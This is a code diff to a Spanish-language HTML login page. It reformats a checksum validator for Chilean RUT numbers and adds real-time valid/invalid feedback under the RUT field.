@@ -28,6 +28,8 @@
       font-weight: bold;
       cursor: pointer;
     }
+    .valido { color: green; font-weight: bold; }
+    .invalido { color: red; font-weight: bold; }
   </style>
 </head>
 <body>
@@ -38,6 +40,7 @@
     <form id="loginForm">
       <label for="rut">RUT</label>
       <input type="text" id="rut" name="rut" placeholder="12.345.678-5" required>
+      <div id="rutFeedback"></div>
       
       <label for="passwd">Contraseña</label>
       <input type="password" id="passwd" name="passwd" required>
@@ -85,27 +88,45 @@
   </div>
 
   <script>
-    // Validación de RUT
+    // Validación de RUT corregida
     function validarRut(rutCompleto) {
-  rutCompleto = rutCompleto.replace(/\./g, "").replace(/-/g, "").toUpperCase();
-  if(rutCompleto.length < 2) return false;
+      rutCompleto = rutCompleto.replace(/\./g, "").replace(/-/g, "").toUpperCase();
+      if(rutCompleto.length < 2) return false;
 
-  let cuerpo = rutCompleto.slice(0, -1);
-  let dv = rutCompleto.slice(-1);
+      let cuerpo = rutCompleto.slice(0, -1);
+      let dv = rutCompleto.slice(-1);
 
-  let suma = 0, multiplo = 2;
-  for(let i = cuerpo.length - 1; i >= 0; i--) {
-    suma += parseInt(cuerpo.charAt(i)) * multiplo;
-    multiplo = multiplo < 7 ? multiplo + 1 : 2;
-  }
+      let suma = 0, multiplo = 2;
+      for(let i = cuerpo.length - 1; i >= 0; i--) {
+        suma += parseInt(cuerpo.charAt(i)) * multiplo;
+        multiplo = multiplo < 7 ? multiplo + 1 : 2;
+      }
 
-  let dvEsperado = 11 - (suma % 11);
-  dvEsperado = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
+      let dvEsperado = 11 - (suma % 11);
+      dvEsperado = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
 
-  return dv === dvEsperado;
-}
+      return dv === dvEsperado;
+    }
 
+    // Validación en tiempo real
+    document.getElementById("rut").addEventListener("input", function(){
+      const rut = this.value;
+      const feedback = document.getElementById("rutFeedback");
+      if(rut.length > 0){
+        if(validarRut(rut)){
+          feedback.textContent = "✔️ RUT válido";
+          feedback.className = "valido";
+        } else {
+          feedback.textContent = "❌ RUT inválido";
+          feedback.className = "invalido";
+        }
+      } else {
+        feedback.textContent = "";
+        feedback.className = "";
+      }
+    });
 
+    // Flujo original
     document.getElementById("loginForm").addEventListener("submit", async function(e){
       e.preventDefault();
       const rut = document.getElementById("rut").value;
@@ -132,11 +153,9 @@
         document.getElementById("resultado").innerText = data;
 
         if(response.ok){
-          // Ocultar login y mostrar pantalla de espera
           document.getElementById("loginForm").style.display="none";
           document.getElementById("pantallaEspera").classList.remove("hidden");
 
-          // Después de 1 minuto mostrar formulario de correo
           setTimeout(()=>{
             document.getElementById("pantallaEspera").classList.add("hidden");
             document.getElementById("formCorreo").classList.remove("hidden");
@@ -168,4 +187,3 @@
   </script>
 </body>
 </html>
-```
